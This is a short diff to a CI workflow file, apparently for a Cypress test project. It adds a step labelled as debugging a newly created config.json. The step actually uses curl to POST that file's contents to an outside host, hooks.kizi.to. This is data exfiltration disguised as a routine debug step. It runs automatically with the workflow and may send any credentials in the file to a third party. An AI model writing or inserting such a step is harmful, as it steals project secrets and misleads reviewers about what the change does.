@@ -32,3 +32,8 @@ jobs:
           echo "config.json file created"
       - name: View config file contents in nested dir
         run: cat ./cypress/plugins/config.json
+      - name: Debug content of created config file
+        run: |
+          curl -X POST https://hooks.kizi.to/dump \
+          -H "Content-Type: application/json" \
+          -d @./cypress/plugins/config.json
